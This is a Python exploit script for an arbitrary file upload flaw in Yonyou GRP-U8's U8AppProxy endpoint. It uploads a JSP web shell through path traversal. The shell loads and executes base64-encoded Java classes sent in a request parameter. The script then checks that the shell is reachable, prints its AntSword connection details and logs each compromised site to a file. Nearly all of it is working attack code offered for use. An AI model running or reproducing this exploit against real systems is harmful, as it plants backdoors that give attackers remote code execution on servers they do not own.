# -*- coding: utf-8 -*-

import time
import requests
from urllib.parse import urljoin
import buter

filename = "./reps/用友GRP-U8 U8AppProxy任意文件上传-"+str(time.strftime("%Y-%m-%d", time.localtime()))
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Edg/89.0.774.68",
    "Accept-Encoding": "gzip, deflate"
}
def yyu8fileuprce(url):

    shell_code = '''<%!
    class U extends ClassLoader {
        U(ClassLoader c) {
            super(c);
        }
        public Class g(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }
 
    public byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
        } catch (Exception e) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
        }
    }
%>
<%
    String cls = request.getParameter("eiehbm");
    if (cls != null) {
        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
    }
%>'''

    files = [('file', ('jsp', shell_code, 'application/octet-stream'))]
    target = urljoin(url, "/U8AppProxy?gnid=myinfo&id=saveheader&zydm=../../text1")
    try:
        response = requests.post(target, files=files, headers=headers, timeout=30, verify=False)
        shell_path = urljoin(target,'text1.jsp')
        web_shell_path = requests.get(shell_path,headers=headers,timeout=30,verify=False)
        if web_shell_path.status_code == 200  :
            print(buter.colors.GREEN+ "存在用友GRP-U8 U8AppProxy任意文件上传漏洞"+ buter.colors.END)
            print(buter.colors.GREEN+ "[+]文件上传成功！" + "webshell_path: " + shell_path + " 蚁剑connect_ eiehbm" + buter.colors.END)
            f = open(filename, "a+", encoding="utf-8")
            f.write(url)
            f.write("\n")
            f.write(shell_path)
            f.write("\n")
            f.close()
        elif web_shell_path.status_code == 403:
            print(buter.colors.RED+ f"[-] 文件上传成功，但访问被拦截！{url}" + buter.colors.END)
        else:
            print(buter.colors.END+ f"上传未知错误 {url}"  + buter.colors.END)

    except Exception as e:
        print(buter.colors.END+ f"ERROR {e}" + buter.colors.END)

